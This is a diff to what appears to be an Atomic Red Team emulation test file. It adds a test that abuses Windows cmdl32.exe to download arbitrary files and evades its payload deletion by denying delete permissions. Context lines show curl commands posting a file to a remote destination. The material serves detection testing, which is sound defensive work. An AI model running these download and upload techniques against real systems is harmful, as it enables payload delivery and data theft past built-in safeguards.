@@ -527,3 +527,28 @@ atomic_tests:
       #{curl_path} -d #{file_path} #{remote_destination}
       #{curl_path} --data #{file_path} #{remote_destination}
     name: command_prompt
+
+- name: Download a file with Microsoft Connection Manager Auto-Download 
+  description: |
+    Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. 
+    The issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.
+    Upon successful execution the test will open calculator and Notepad executable for 10 seconds.
+    reference:
+    https://twitter.com/ElliotKillick/status/1455897435063074824
+    https://github.com/LOLBAS-Project/LOLBAS/pull/151
+    https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/
+    https://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html
+  supported_platforms:
+    - windows
+  input_arguments:
+    Path_to_file:
+      description: Path to the Batch script
+      type: Path
+      default: PathToAtomicsFolder\T1105\src\T1105.bat
+  executor:
+    command: |
+      #{Path_to_file} 1>NUL 
+    cleanup_command: |
+      del /f/s/q %temp%\T1105 >nul 2>&1
+      rmdir /s/q %temp%\T1105 >nul 2>&1
+    name: command_prompt
